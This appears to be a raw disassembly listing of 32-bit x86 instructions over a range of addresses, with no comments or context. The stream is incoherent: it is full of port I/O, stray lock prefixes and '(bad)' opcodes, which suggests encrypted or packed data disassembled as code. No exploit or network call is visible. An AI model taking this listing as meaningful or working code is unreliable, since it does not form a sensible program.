  424429:	jge    0x42449c
  42442b:	in     al,dx
  42442c:	lock out dx,eax
  42442e:	push   eax
  42442f:	lock test BYTE PTR [eax-0x687f7510],al
  424436:	mov    dl,BYTE PTR [ebx+0x51]
  424439:	push   ebx
  42443a:	pushf  
  42443b:	mov    dl,0xbe
  42443d:	or     al,0xb2
  42443f:	clc    
  424440:	sub    edi,edi
  424442:	inc    BYTE PTR [eax-0xfaf7569]
  424448:	jp     0x4243ca
  42444a:	out    dx,eax
  42444b:	push   eax
  42444c:	lock stc 
  42444e:	xor    al,0x8a
  424451:	push   ebx
  424452:	jle    0x4244a7
  424454:	sub    dh,BYTE PTR [edx+0x7b229ba]
  42445a:	or     al,0xff
  42445c:	mov    dh,0x80
  42445e:	lock stc 
  424460:	arpl   si,di
  424462:	aad    0x6f
  424464:	in     al,dx
  424465:	lock out dx,eax
  424467:	push   eax
  424468:	lock jp 0x4243eb
  42446b:	lock mov al,BYTE PTR [eax+0x51538a97]
  424472:	push   ebx
  424473:	pushf  
  424474:	mov    dl,0xbe
  424476:	or     al,0xb2
  424478:	clc    
  424479:	sub    edi,edi
  42447b:	(bad)  
  42447c:	in     al,dx
  42447d:	jge    0x4244a0
  42447f:	jl     0x4244f8
  424481:	xor    cl,0x24
  424484:	outs   dx,DWORD PTR ds:[esi]
  424485:	cmp    ah,ch
  424487:	lock out dx,eax
  424489:	push   eax
  42448a:	lock xchg esp,eax
  42448d:	in     al,dx
  42448e:	xor    al,0x87
  424491:	xor    BYTE PTR [edi+0x21],0x80
  424495:	int    0x32
  424497:	cmp    cl,BYTE PTR [ebp+0x714d968d]
  42449d:	xor    BYTE PTR [edi+0x21],0x4d
  4244a1:	xlat   BYTE PTR ds:[ebx]
  4244a2:	xchg   DWORD PTR [eax-0x72c5cd33],eax
  4244a8:	lea    ecx,[ebp+0xa]
  4244ab:	and    DWORD PTR [edi+esi*2-0x7d],edi
  4244af:	add    dl,ch
  4244b1:	cs jne 0x424530
  4244b4:	ja     0x424439
  4244b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b7:	push   ss
  4244b8:	outs   dx,DWORD PTR ds:[esi]
  4244b9:	cmp    BYTE PTR [eax-0x687f7510],al
  4244bf:	mov    dl,BYTE PTR [ebx+0x51]
  4244c2:	push   ebx
  4244c3:	pushf  
  4244c4:	mov    dl,0xbe
  4244c6:	or     al,0xb2
  4244c8:	clc    
  4244c9:	sub    edi,edi
  4244cb:	(bad)  
  4244cc:	push   eax
  4244cd:	ja     0x4244c8
  4244cf:	arpl   bp,di
  4244d1:	xlat   BYTE PTR ds:[ebx]
  4244d2:	pop    ecx
  4244d3:	xor    BYTE PTR [edi-0x75],0x80
  4244d7:	lock mov edx,DWORD PTR [ebx-0x4]
  4244db:	push   ebx
  4244dc:	sub    dh,BYTE PTR [edx-0x794dd646]
  4244e2:	or     al,0xff
  4244e4:	mov    dl,0x80
  4244e6:	lock add DWORD PTR [eax-0x63ac7c69],0x53
  4244ee:	push   ecx
  4244ef:	mov    dl,0xf8
  4244f1:	sub    esp,ebp
  4244f3:	add    BYTE PTR [eax-0x327fde89],0x32
  4244fa:	cmp    cl,BYTE PTR [ebp+0xcbeb28d]
  424500:	push   DWORD PTR [esi-0x556bddf7]
  424506:	dec    ebp
  424507:	or     dh,BYTE PTR ds:0x808a7780
  42450d:	lock mov dl,BYTE PTR [ebx-0x4]
  424511:	push   ebx
  424512:	sub    dh,BYTE PTR [edx-0x454df37a]
  424518:	sub    edi,edi
  42451a:	mov    dl,0x63
  42451c:	ja     0x424517
  42451e:	xlat   BYTE PTR ds:[ebx]
  42451f:	mov    al,0x80
  424521:	ja     0x4244a5
  424523:	xor    al,0x82
  424526:	push   ebx
  424527:	sub    dl,BYTE PTR [ebx-0x4]
  42452a:	mov    dl,0x86
  42452c:	or     al,0xb2
  42452e:	mov    edx,0x63fdff29
  424533:	mov    al,ds:0x4d954c09
  424538:	dec    ebp
  424539:	dec    ebp
  42453a:	xor    BYTE PTR [edi-0x76],0x80
  42453e:	lock mov dl,BYTE PTR [ebx-0x4]
  424542:	push   ebx
  424543:	sub    dh,BYTE PTR [edx-0x454df37a]
  424549:	sub    edi,edi
  42454b:	mov    dl,0x63
  42454d:	ja     0x424548
  42454f:	xlat   BYTE PTR ds:[ebx]
  424550:	mov    al,0x80
  424552:	ja     0x4244df
  424554:	xor    al,0x8b
  424557:	push   ebx
  424558:	cld    
  424559:	push   ebx
  42455a:	sub    dh,BYTE PTR [edx-0x454df37a]
  424560:	sub    edi,edi
  424562:	mov    dl,0x3a
  424564:	ja     0x4244ec
  424566:	mov    esi,0x8d8d3aae
  42456b:	jl     0x4245e4
  42456d:	xchg   DWORD PTR [ecx+0x7c66f7ea],esi
  424573:	ja     0x42453d
  424575:	fld    DWORD PTR [ebp-0x587f12e3]
  42457b:	mov    al,BYTE PTR [eax+0x4538a77]
  424581:	push   ebx
  424582:	jl     0x424536
  424584:	les    ecx,FWORD PTR [edx+esi*4]
  424587:	test   BYTE PTR [ecx],ch
  424589:	inc    DWORD PTR [edx-0x72c5e442]
  42458f:	lea    eax,[eax-0xf7f7589]
  424595:	mov    dl,BYTE PTR [ebx-0x4]
  424598:	push   ebx
  424599:	sub    dh,BYTE PTR [edx-0x454df37a]
  42459f:	sub    edi,edi
  4245a1:	mov    dl,0x50
  4245a3:	ja     0x42452c
  4245a5:	xor    BYTE PTR [edi-0x76],0x80
  4245a9:	lock mov dl,BYTE PTR [ebx-0x4]
  4245ad:	push   ebx
  4245ae:	sub    dh,BYTE PTR [edx-0x454df37a]
  4245b4:	sub    edi,edi
  4245b6:	mov    dl,0x50
  4245b8:	ja     0x424582
  4245ba:	xor    al,0x8a
  4245bd:	xor    BYTE PTR [edi-0x76],0x53
  4245c1:	push   ecx
  4245c2:	push   ebx
  4245c3:	jl     0x424577
  4245c5:	test   BYTE PTR [ecx],ch
  4245c7:	mov    dl,0xbe
  4245c9:	or     al,0xff
  4245cb:	std    
  4245cc:	xor    BYTE PTR [edi+0x7a],0x63
  4245d0:	std    
  4245d1:	aad    0x6f
  4245d3:	sub    dh,0x1e
  4245d6:	push   eax
  4245d7:	ja     0x424560
  4245d9:	xor    BYTE PTR [edi-0x7c],0x80
  4245dd:	out    dx,al
  4245de:	push   ds
  4245df:	push   eax
  4245e0:	ja     0x4245aa
  4245e2:	xor    BYTE PTR [edi-0x76],0x80
  4245e6:	lock mov dl,BYTE PTR [ebx-0x4]
  4245ea:	push   ebx
  4245eb:	sub    dh,BYTE PTR [edx-0x794dd646]
  4245f1:	or     al,0xff
  4245f3:	mov    dl,0x80
  4245f5:	lock xchg DWORD PTR [ebx-0x4e],esp
  4245f9:	aad    0x55
  4245fb:	xor    BYTE PTR [edi-0x76],0x80
  4245ff:	lock mov dl,BYTE PTR [ebx+0x2a]
  424603:	push   ebx
  424604:	cld    
  424605:	mov    dl,0xba
  424607:	sub    DWORD PTR [edx-0x4d00f37a],esi
  42460d:	xor    al,0x87
  424610:	mov    dl,0xbe
  424612:	sub    esp,DWORD PTR [ebx-0x4e]
  424615:	aad    0x1d
  424617:	xor    al,0x87
  42461a:	xor    BYTE PTR [edi+0x21],0x80
  42461e:	int    0x32
  424620:	cmp    cl,BYTE PTR [ebp+0x705c098d]
  424626:	xchg   esi,eax
  424627:	dec    ebp
  424628:	xlat   BYTE PTR ds:[ebx]
  424629:	stc    
  42462a:	dec    ebp
  42462b:	or     ch,bh
  42462d:	les    ebx,FWORD PTR [edi]
  42462f:	xor    BYTE PTR [edi-0x38],0xec
  424633:	ja     0x424624
  424635:	xor    al,0x21
  424638:	adc    BYTE PTR [eax+0x32],0x3a
  42463c:	lea    ecx,[ebp+0xa0c6aed]
  424642:	dec    ebp
  424643:	xlat   BYTE PTR ds:[ebx]
  424644:	stc    
  424645:	dec    ebp
  424646:	xchg   esi,eax
  424647:	out    dx,eax
  424648:	push   eax
  424649:	ja     0x424613
  42464b:	xor    BYTE PTR [edi-0x76],0x80
  42464f:	lock mov dl,BYTE PTR [ebx-0x4]
  424653:	push   ebx
  424654:	sub    dh,BYTE PTR [edx-0x794dd646]
  42465a:	or     al,0xff
  42465c:	mov    dl,0x80
  42465e:	lock enter 0xb263,0x80
  424663:	ja     0x4245f0
  424665:	xor    al,0x8b
  424668:	xlat   BYTE PTR ds:[ebx]
  424669:	push   cs
  42466a:	push   ebx
  42466b:	cld    
  42466c:	push   ebx
  42466d:	sub    dh,BYTE PTR [edx-0x454df37a]
  424673:	sub    edi,edi
  424675:	mov    dl,0x3a
  424677:	ja     0x4245ff
  424679:	les    ebx,FWORD PTR ds:0xfc532a53
  42467f:	mov    dl,0xba
  424681:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424687:	xor    al,0xc8
  42468a:	or     DWORD PTR [edx],esp
  42468c:	mov    dl,0x80
  42468e:	lock test BYTE PTR [eax-0x12],dl
  424692:	and    BYTE PTR [eax-0xf7f7489],al
  424698:	mov    edx,DWORD PTR [ebx-0x4]
  42469b:	push   ebx
  42469c:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246a2:	sub    edi,edi
  4246a4:	mov    dl,0xec
  4246a6:	add    BYTE PTR [eax-0xf7f7589],0x8a
  4246ad:	push   ebx
  4246ae:	sub    dl,BYTE PTR [ebx-0x4]
  4246b1:	mov    dl,0xba
  4246b3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4246b9:	xor    al,0x84
  4246bc:	pop    edi
  4246bd:	out    dx,al
  4246be:	and    BYTE PTR [ecx],cl
  4246c0:	dec    edi
  4246c1:	adc    DWORD PTR ds:0x77804d4d,ecx
  4246c7:	xor    al,BYTE PTR [eax-0x4d92cd10]
  4246cd:	xchg   BYTE PTR [ecx],ch
  4246cf:	add    DWORD PTR [ecx],esp
  4246d1:	add    esi,ebp
  4246d3:	lea    ecx,[ebp-0x7f4d0073]
  4246d9:	lock not DWORD PTR [edi-0xa]
  4246dd:	and    al,0x6f
  4246df:	cmp    BYTE PTR [esi+0x4d4d8afe],bh
  4246e5:	xor    BYTE PTR [edi-0x76],0x80
  4246e9:	lock mov dl,BYTE PTR [ebx-0x4]
  4246ed:	push   ebx
  4246ee:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246f4:	sub    edi,edi
  4246f6:	mov    dl,0x5f
  4246f8:	ja     0x424680
  4246fa:	xlat   BYTE PTR ds:[ebx]
  4246fb:	out    dx,eax
  4246fc:	xor    BYTE PTR [edi-0x75],0x80
  424700:	lock mov eax,esp
  424703:	outs   dx,DWORD PTR ds:[esi]
  424704:	xor    BYTE PTR [edi-0x76],0x80
  424708:	lock mov dl,BYTE PTR [ebx+0x2a]
  42470c:	push   ebx
  42470d:	cld    
  42470e:	stos   DWORD PTR es:[edi],eax
  42470f:	mov    dl,0xba
  424711:	sub    DWORD PTR [edx-0x56f37a],esi
  424717:	mov    dl,0xa3
  424719:	jo     0x424716
  42471b:	out    dx,eax
  42471c:	lea    edx,[edi-0x78127880]
  424722:	xor    eax,0xf68a777c
  424727:	and    al,0x6f
  424729:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  42472d:	cmc    
  42472e:	and    al,0x6f
  424730:	cmp    BYTE PTR [eax+0x77502177],al
  424736:	and    DWORD PTR [ecx+0x77806a80],ebx
  42473c:	mov    al,BYTE PTR [eax+0xde28a97]
  424742:	pusha  
  424743:	and    ah,BYTE PTR [edi+ebp*2]
  424746:	cmp    BYTE PTR [ebx-0x4e],dl
  424749:	test   eax,0xf8b27e53
  42474e:	sub    DWORD PTR [edx-0x400f37a],esi
  424754:	adc    BYTE PTR [edi+0x9f763ef],0xf
  42475b:	loopne 0x424797
  42475d:	lea    ecx,[ebp-0x7f108880]
  424763:	xchg   edi,eax
  424764:	out    dx,eax
  424765:	in     al,dx
  424766:	or     ah,BYTE PTR [ebp-0x65]
  424769:	push   eax
  42476a:	xchg   edi,eax
  42476b:	enter  0x777c,0x8b
  42476f:	icebp  
  424770:	and    al,0x6f
  424772:	cmp    BYTE PTR [eax-0x687f7489],al
  424778:	mov    edx,DWORD PTR [ebx+0x7e]
  42477b:	mov    dl,0xf8
  42477d:	sub    DWORD PTR [ebx-0x4e],edx
  424780:	mov    dl,0x86
  424782:	or     al,0xff
  424784:	sti    
  424785:	adc    BYTE PTR [edi-0x75187f76],0x53
  42478c:	mov    dh,0x53
  42478e:	or     eax,0xb229bcb2
  424793:	pop    es
  424794:	or     al,0xff
  424796:	pushf  
  424797:	and    bh,0xc8
  42479a:	pop    edi
  42479b:	xchg   ebp,eax
  42479c:	jl     0x42477b
  42479e:	or     DWORD PTR [edi],ecx
  4247a0:	mov    bl,0x3a
  4247a2:	lea    ecx,[ebp-0x7f376880]
  4247a8:	ja     0x424799
  4247aa:	in     al,dx
  4247ab:	jmp    0x9780:0x8d8d8d2e
  4247b2:	out    dx,eax
  4247b3:	and    bh,0xc8
  4247b6:	inc    ebx
  4247b7:	fwait
  4247b8:	push   ebp
  4247b9:	and    bh,0x8a
  4247bc:	xchg   ebx,eax
  4247bd:	and    BYTE PTR [edi+0x53cb538a],0x4
  4247c4:	mov    dl,0x61
  4247c6:	or     al,0xb2
  4247c8:	mov    ah,0x29
  4247ca:	inc    DWORD PTR [esi]
  4247cc:	push   eax
  4247cd:	xchg   edi,eax
  4247ce:	and    DWORD PTR [ebx-0x64],0x9
  4247d2:	jns    0x80cfd512
  4247d8:	xchg   edi,eax
  4247d9:	mov    al,BYTE PTR [eax-0x49ac7519]
  4247df:	push   ebx
  4247e0:	or     eax,0xb20c07b2
  4247e5:	mov    esp,0x509cff29
  4247ea:	xchg   edi,eax
  4247eb:	xor    bh,BYTE PTR [edi+esi*2+0x21]
  4247ef:	repz and al,0x6f
  4247f2:	cmp    BYTE PTR [eax-0x187f7569],al
  4247f8:	mov    dl,BYTE PTR [ebx-0x4a]
  4247fb:	push   ebx
  4247fc:	or     eax,0xb20c07b2
  424801:	mov    esp,0xbe9cff29
  424806:	add    eax,0x808d8d8d
  42480b:	xchg   edi,eax
  42480c:	mov    al,BYTE PTR [eax+0xbed8ad7]
  424812:	or     eax,0x2b2b653
  424817:	sub    DWORD PTR [edx+0x7eff0c07],esi
  42481d:	add    ebx,edx
  42481f:	mov    esi,DWORD PTR [esi+0x97e6388]
  424825:	in     eax,dx
  424826:	jmp    0x43cfd5b8
  42482b:	ret    0xe501
  42482e:	or     ch,bh
  424830:	push   eax
  424831:	xlat   BYTE PTR ds:[ebx]
  424832:	stc    
  424833:	or     DWORD PTR [ebx+ebx*1-0x5e],ebx
  424837:	clc    
  424838:	dec    ebp
  424839:	or     DWORD PTR [ebp-0x7868af73],ecx
  42483f:	adc    BYTE PTR [edi-0x7f8e1379],0xd7
  424846:	xchg   esp,ebp
  424848:	xor    DWORD PTR [edx+0x2b22907],0x9c2ff0c
  424852:	pop    esp
  424853:	sbb    esi,DWORD PTR [edx+0xba22107]
  424859:	mul    BYTE PTR [edi+ebp*2]
  42485c:	cmp    BYTE PTR [eax-0x29],dl
  42485f:	xchg   DWORD PTR [eax-0x69],edx
  424862:	xchg   BYTE PTR [eax-0x287f7869],al
  424868:	xchg   DWORD PTR [ebx-0x4a],edx
  42486b:	in     eax,dx
  42486c:	or     ecx,DWORD PTR ds:0xb20c07b2
  424872:	add    ch,BYTE PTR [ecx]
  424874:	(bad)  
  424875:	jle    0x424863
  424877:	xchg   edi,eax
  424878:	out    dx,eax
  424879:	push   eax
  42487a:	xchg   edi,eax
  42487b:	xchg   DWORD PTR [eax-0x287fde69],eax
  424881:	and    DWORD PTR [ebx-0x4a],edx
  424884:	in     eax,dx
  424885:	or     ecx,DWORD PTR ds:0xb22902b2
  42488b:	pop    es
  42488c:	or     al,0xff
  42488e:	jle    0x424810
  424890:	xlat   BYTE PTR ds:[ebx]
  424891:	xchg   BYTE PTR [ebx-0x3e],ah
  424894:	xlat   BYTE PTR ds:[ebx]
  424895:	rol    BYTE PTR [eax-0x287fde69],0x21
  42489c:	push   ebx
  42489d:	mov    dh,0xed
  42489f:	or     ecx,DWORD PTR ds:0xb22902b2
  4248a5:	pop    es
  4248a6:	or     al,0xff
  4248a8:	jle    0x42482a
  4248aa:	xlat   BYTE PTR ds:[ebx]
  4248ab:	xchg   BYTE PTR [ebx-0x3e],ah
  4248ae:	xlat   BYTE PTR ds:[ebx]
  4248af:	out    dx,eax
  4248b0:	adc    BYTE PTR [edi-0x7c287f79],0x3a
  4248b7:	aam    0xed
  4248b9:	jl     0x4248c7
  4248bb:	dec    ebp
  4248bc:	lock stc 
  4248be:	or     DWORD PTR [edi+0x12],ecx
  4248c1:	dec    ebp
  4248c2:	dec    ebp
  4248c3:	dec    ebp
  4248c4:	cmp    ah,BYTE PTR [edi-0x74687fce]
  4248ca:	adc    bh,0x8b
  4248cd:	push   ebx
  4248ce:	mov    dh,0xed
  4248d0:	or     ecx,DWORD PTR ds:0xb22902b2
  4248d6:	pop    es
  4248d7:	or     al,0xff
  4248d9:	jle    0x42485b
  4248db:	xlat   BYTE PTR ds:[ebx]
  4248dc:	xor    al,BYTE PTR [eax-0x2a9c3719]
  4248e2:	pushf  
  4248e3:	in     eax,0xd3
  4248e5:	sub    eax,0x808a9780
  4248ea:	xlat   BYTE PTR ds:[ebx]
  4248eb:	mov    dl,BYTE PTR [ebx-0x4a]
  4248ee:	in     eax,dx
  4248ef:	or     ecx,DWORD PTR ds:0xb20c07b2
  4248f5:	add    ch,BYTE PTR [ecx]
  4248f7:	in     al,dx
  4248f8:	je     0x4248f9
  4248fa:	jle    0x42487c
  4248fc:	popf   
  4248fd:	out    dx,al
  4248fe:	arpl   WORD PTR [ebx],ax
  424900:	or     DWORD PTR [edi-0x12],ecx
  424903:	dec    ebp
  424904:	dec    ebp
  424905:	dec    ebp
  424906:	mov    ds:0x53847780,eax
  42490b:	mov    dl,0x80
  42490d:	lock test ch,ch
  424910:	add    eax,0xa6c4ab0d
  424915:	xor    BYTE PTR [edi-0x76],0x53
  424919:	mov    dl,0x80
  42491b:	lock mov dl,BYTE PTR [ebx+0x51]
  42491f:	mov    dl,0xba
  424921:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424927:	test   eax,0x8deffb70
  42492c:	xchg   edi,eax
  42492d:	add    BYTE PTR [edi-0x7285785e],0x8d
  424934:	lea    edi,[edi+esi*2-0x76]
  424938:	mul    BYTE PTR [edi+ebp*2]
  42493b:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  42493f:	cmc    
  424940:	and    al,0x6f
  424942:	cmp    BYTE PTR [eax-0xf7f7589],al
  424948:	mov    bl,BYTE PTR [ecx-0x5f21d65]
  42494e:	and    ah,BYTE PTR [edi+ebp*2]
  424951:	cmp    BYTE PTR [ebx-0x4],dl
  424954:	mov    dl,0x86
  424956:	or     al,0xae
  424958:	push   ebx
  424959:	(bad)  
  42495a:	mov    dl,0xba
  42495c:	sub    edi,edi
  42495e:	mov    dl,0x50
  424960:	ja     0x4248e6
  424962:	xor    BYTE PTR [edi-0x76],0x80
  424966:	lock mov dl,BYTE PTR [ebx-0x4]
  42496a:	mov    dl,0x86
  42496c:	or     al,0x53
  42496e:	(bad)  
  42496f:	mov    dl,0xba
  424971:	sub    edi,edi
  424973:	mov    dl,0x50
  424975:	ja     0x42496e
  424977:	and    bh,0x25
  42497a:	xor    BYTE PTR [edi-0x79],0x80
  42497e:	lock xchg DWORD PTR [ebx-0x4e],edx
  424982:	push   eax
  424983:	ja     0x42490c
  424985:	mov    ds:0xa3f68777,al
  42498a:	outs   dx,DWORD PTR ds:[esi]
  42498b:	cmp    BYTE PTR [eax-0xf7f3789],al
  424991:	enter  0xb253,0x50
  424995:	ja     0x42495f
  424997:	mov    ds:0xe9f6c877,al
  42499c:	outs   dx,DWORD PTR ds:[esi]
  42499d:	cmp    BYTE PTR [eax-0xf7fcd89],al
  4249a3:	xor    dl,BYTE PTR [ebx-0x4e]
  4249a6:	push   eax
  4249a7:	ja     0x4249db
  4249a9:	mov    ds:0x24fa3277,al
  4249ae:	outs   dx,DWORD PTR ds:[esi]
  4249af:	cmp    BYTE PTR [eax-0xf7f0689],al
  4249b5:	stc    
  4249b6:	push   ebx
  4249b7:	mov    dl,0x50
  4249b9:	ja     0x4249b4
  4249bb:	mov    ds:0x24f6f977,al
  4249c0:	out    dx,al
  4249c1:	cmp    BYTE PTR [edi+esi*2+0x25],bh
  4249c5:	jmp    0x807ad68c
  4249ca:	ja     0x4249bb
  4249cc:	dec    edi
  4249cd:	push   0x9
  4249cf:	movd   mm5,DWORD PTR [edi]
  4249d2:	lea    ecx,[ebp+0x4f217780]
  4249d8:	push   0x9
  4249da:	(bad)  
  4249dc:	das    
  4249dd:	lea    ecx,[ebp+0x4f1d7780]
  4249e3:	push   0x9
  4249e5:	mov    db5,edi
  4249e8:	lea    ecx,[ebp-0x7fda8880]
  4249ee:	ja     0x424a15
  4249f0:	xor    al,0xef
  4249f3:	mov    dl,0x86
  4249f5:	or     al,0x57
  4249f7:	(bad)  
  4249f8:	hlt    
  4249f9:	lea    ecx,[ebp+0x93a5fb9]
  4249ff:	dec    edi
  424a00:	cmp    ch,BYTE PTR [edi]
  424a02:	lea    ecx,[ebp-0x7f758880]
  424a08:	lock mov dl,BYTE PTR [ebx-0x4]
  424a0c:	mov    dl,0x86
  424a0e:	or     al,0x53
  424a10:	(bad)  
  424a11:	mov    dl,0xba
  424a13:	sub    edi,edi
  424a15:	mov    dl,0x50
  424a17:	ja     0x424a10
  424a19:	xor    BYTE PTR [edi-0x76],0x80
  424a1d:	ja     0x4249a9
  424a1f:	xor    BYTE PTR [edi-0x11],0x80
  424a23:	lock out dx,eax
  424a25:	in     al,dx
  424a26:	jge    0x424a8d
  424a28:	adc    BYTE PTR [edx+0x25f0500a],0x4f
  424a2f:	push   0x9
  424a31:	cvtpi2ps xmm5,mm6
  424a34:	lea    ecx,[ebp-0x9858884]
  424a3a:	and    al,0x79
  424a3c:	cmp    BYTE PTR [eax-0x7f6c8589],al
  424a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a43:	jp     0x424a98
  424a45:	cld    
  424a46:	push   ebx
  424a47:	add    esi,DWORD PTR [edx-0x4b4df37a]
  424a4d:	sub    edi,edi
  424a4f:	adc    BYTE PTR [eax-0x59],0x7a
  424a53:	xor    BYTE PTR [edi-0x76],0x80
  424a57:	ja     0x4249e3
  424a59:	or     dh,0x2e
  424a5c:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  424a62:	stos   BYTE PTR es:[edi],al
  424a63:	gs in  al,dx
  424a65:	jno    0x4249e7
  424a67:	ja     0x4249f3
  424a69:	xor    BYTE PTR [edi-0x76],0x80
  424a6d:	into   
  424a6e:	cmp    cl,BYTE PTR es:[ebp+0x501d808d]
  424a75:	xchg   edi,eax
  424a76:	and    DWORD PTR [ebx-0x5c],esp
  424a79:	xlat   BYTE PTR ds:[ebx]
  424a7a:	imul   eax,DWORD PTR [eax-0x317f3710],0x32
  424a81:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424a87:	stos   BYTE PTR es:[edi],al
  424a88:	adc    BYTE PTR [edi-0x12aeac38],0xc2
  424a8f:	or     eax,0xb20cbeb2
  424a94:	clc    
  424a95:	sub    edi,edi
  424a97:	mov    dh,0x80
  424a99:	lock and DWORD PTR [edx-0x6cf561b3],ebp
  424aa0:	dec    ebp
  424aa1:	or     ah,BYTE PTR ds:0x8021f080
  424aa7:	xchg   edx,eax
  424aa8:	xchg   ebp,eax
  424aa9:	cmp    BYTE PTR [edi+0xa],0x43
  424aad:	std    
  424aae:	xchg   esi,eax
  424aaf:	in     al,dx
  424ab0:	je     0x424abc
  424ab2:	xchg   BYTE PTR [ecx-0x7f727291],ah
  424ab8:	lock and eax,0x3a36ce80
  424abe:	lea    ecx,[ebp-0x61b2e2b0]
  424ac4:	xchg   ebp,eax
  424ac5:	dec    ebp
  424ac6:	xlat   BYTE PTR ds:[ebx]
  424ac7:	out    dx,eax
  424ac8:	xchg   ebx,eax
  424ac9:	xchg   BYTE PTR [edi-0x7f727212],ch
  424acf:	xchg   ebx,eax
  424ad0:	gs in  al,dx
  424ad2:	xchg   esp,eax
  424ad3:	or     DWORD PTR [eax+ebx*8+0x15],ebx
  424ad7:	add    DWORD PTR [ebp+0x71],esi
  424ada:	sbb    eax,0x801d7750
  424adf:	ja     0x424a6b
  424ae1:	xor    al,0x8a
  424ae4:	push   ebx
  424ae5:	cld    
  424ae6:	in     eax,dx
  424ae7:	add    eax,0x29bab20d
  424aec:	mov    dl,0x86
  424aee:	or     al,0xff
  424af0:	mov    dl,0x9
  424af2:	pop    esp
  424af3:	fisubr DWORD PTR [edi+0x50]
  424af6:	xchg   edi,eax
  424af7:	and    eax,0xf09fd63
  424afc:	mov    esp,0x808d8d8d
  424b01:	ja     0x424a8d
  424b03:	xor    al,0x8a
  424b06:	push   ebx
  424b07:	cld    
  424b08:	in     eax,dx
  424b09:	add    eax,0x29bab20d
  424b0e:	mov    dl,0x86
  424b10:	or     al,0xff
  424b12:	mov    dl,0x50
  424b14:	ja     0x424a99
  424b16:	xor    BYTE PTR [edi-0x75],0x80
  424b1a:	lock mov ebp,ebp
  424b1d:	add    eax,0xb2fc530d
  424b22:	mov    edx,0xc86b229
  424b27:	push   DWORD PTR [edx+0x6fda5c09]
  424b2d:	inc    ebx
  424b2e:	std    
  424b2f:	pop    edi
  424b30:	lock or DWORD PTR [ecx],0xffffffce
  424b34:	and    cl,BYTE PTR [ebp-0xf7f7273]
  424b3a:	sbb    eax,0x50efb2ed
  424b3f:	lock sbb eax,0xf080ecc4
  424b45:	sbb    eax,0x805dd880
  424b4a:	push   cs
  424b4b:	push   eax
  424b4c:	ja     0x424ad0
  424b4e:	jge    0x424b9f
  424b50:	not    ebp
  424b52:	xor    BYTE PTR [ebx-0x9],cl
  424b55:	xor    edi,ebx
  424b57:	in     al,dx
  424b58:	ja     0x424adc
  424b5a:	les    ecx,FWORD PTR [eax+eax*4]
  424b5d:	sti    
  424b5e:	or     al,BYTE PTR [eax+0x74ecee92]
  424b64:	or     al,BYTE PTR [esi-0x7272d05d]
  424b6a:	xor    BYTE PTR [edi+0x1d],0x80
  424b6e:	jge    0x424b5f
  424b70:	push   eax
  424b71:	lock add BYTE PTR [eax-0x687f7510],0x8a
  424b79:	push   ebx
  424b7a:	push   ecx
  424b7b:	in     eax,dx
  424b7c:	ret    0xb20d
  424b7f:	mov    esi,0x29f8b20c
  424b84:	(bad)  
  424b85:	(bad)  
  424b86:	pop    edi
  424b87:	lock adc ch,0x1d
  424b8b:	xor    al,0xef
  424b8e:	in     al,dx
  424b8f:	jge    0x424bb2
  424b91:	dec    ebp
  424b92:	xlat   BYTE PTR ds:[ebx]
  424b93:	add    BYTE PTR [eax-0x13691193],0x74
  424b9a:	or     al,BYTE PTR [esi-0x7272137b]
  424ba0:	xor    BYTE PTR [edi+0x1d],0x80
  424ba4:	lock mov eax,DWORD PTR [eax+0x51538b97]
  424bab:	mov    dl,0xbe
  424bad:	or     al,0xed
  424baf:	ret    0xed0d
  424bb2:	push   0x3d
  424bb4:	mov    dl,0xf8
  424bb6:	sub    edi,edi
  424bb8:	(bad)  
  424bb9:	cmp    dh,al
  424bbb:	add    DWORD PTR [eax+0x77502597],0x1d
  424bc2:	xor    BYTE PTR [edi-0x75],0x80
  424bc6:	lock mov ebp,ebp
  424bc9:	add    eax,0xb2fc530d
  424bce:	mov    edx,0xc86b229
  424bd3:	push   DWORD PTR [edx+0x925f080]
  424bd9:	pop    esp
  424bda:	jg     0x424c4b
  424bdc:	inc    ebx
  424bdd:	std    
  424bde:	pop    edi
  424bdf:	lock or DWORD PTR [ecx],0x4c
  424be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424be4:	dec    ebp
  424be5:	dec    ebp
  424be6:	dec    ebp
  424be7:	or     dh,0x26
  424bea:	cmp    cl,BYTE PTR [ebp-0x28e29c73]
  424bf0:	push   ebx
  424bf1:	xor    al,0x32
  424bf4:	or     dh,0x32
  424bf7:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424bfd:	stos   BYTE PTR es:[edi],al
  424bfe:	adc    BYTE PTR [edi-0x12aeacce],0xc2
  424c05:	or     eax,0xb20cbeb2
  424c0a:	clc    
  424c0b:	sub    edi,edi
  424c0d:	mov    dh,0x80
  424c0f:	lock and DWORD PTR [edx-0x6c6a61b3],ebp
  424c16:	dec    ebp
  424c17:	or     ah,BYTE PTR ds:0xf096a4f
  424c1d:	pushf  
  424c1e:	or     al,0x8d
  424c20:	lea    eax,[eax-0x317fda69]
  424c26:	cmp    BYTE PTR [edx],0x8d
  424c29:	lea    eax,[eax+0x53fd808d]
  424c2f:	push   ecx
  424c30:	in     eax,dx
  424c31:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424c37:	test   BYTE PTR [ecx],ch
  424c39:	(bad)  
  424c3a:	std    
  424c3b:	or     DWORD PTR [edi],ecx
  424c3d:	jb     0x424c79
  424c3f:	lea    ecx,[ebp-0x7f758880]
  424c45:	lock mov dl,BYTE PTR [ebx-0x4]
  424c49:	in     eax,dx
  424c4a:	add    eax,0xc86b20d
  424c4f:	mov    dl,0xba
  424c51:	sub    edi,edi
  424c53:	mov    dl,0x50
  424c55:	ja     0x424bdd
  424c57:	pop    esi
  424c58:	imul   ebp,ecx,0x7d01386f
  424c5e:	test   BYTE PTR [eax-0x10],dl
  424c61:	pop    esi
  424c62:	push   eax
  424c63:	lock data16 jl 0x424cde
  424c67:	inc    esi
  424c68:	sbb    ecx,ebp
  424c6a:	outs   dx,DWORD PTR ds:[esi]
  424c6b:	cmp    BYTE PTR [edi+esi*2+0x62],bh
  424c6f:	call   0x507abc5d
